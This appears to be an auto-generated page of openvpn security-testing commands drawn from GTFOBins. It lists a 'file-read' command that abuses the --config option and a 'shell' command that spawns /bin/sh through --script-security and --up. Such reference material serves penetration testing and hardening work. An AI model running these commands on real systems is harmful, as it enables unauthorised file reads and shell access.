---
parsed_by: focuslocust
source: commands
type: generated
---
# openvpn Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## openvpn

Tool page: [openvpn](../../tools/linux/openvpn.md)

### file-read

```text
openvpn --config /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openvpn` |
| Evidence | Function example preserved from source parser. |

### shell

```text
openvpn --dev null --script-security 2 --up '/bin/sh -s'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openvpn` |
| Evidence | Function example preserved from source parser. |
